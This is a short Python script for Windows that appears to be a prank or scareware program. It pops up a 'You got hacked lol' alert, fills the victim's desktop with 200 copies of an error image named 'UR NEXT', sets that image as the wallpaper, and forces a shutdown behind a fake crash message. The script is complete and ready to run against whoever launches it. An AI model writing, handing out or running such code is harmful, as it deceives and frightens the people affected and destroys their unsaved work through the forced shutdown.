s
import time
import pymsgbox
import os
import shutil
import ctypes

pymsgbox.alert(icon=4096 + 16, text="You got hacked lol", title="Hi friend")

time.sleep(3)

dpath = os.environ["USERPROFILE"] + "/Desktop/"

if os.path.exists(os.environ["USERPROFILE"] + "/OneDrive/"):
    dpath = os.environ["USERPROFILE"] + "/OneDrive/Desktop/"

for i in range(200):
    shutil.copy(r"C:\windows\system32\securityandmaintenance_error.png", dpath + "UR NEXT " + str(i) + ".png")

ctypes.windll.user32.SystemParametersInfoW(20, 0, r"C:\windows\system32\securityandmaintenance_error.png", 0)

time.sleep(5)
os.system("shutdown.exe /s /f /t 5 /c \"windows.exe has crahsed, shutting down in 10 seconds\"")
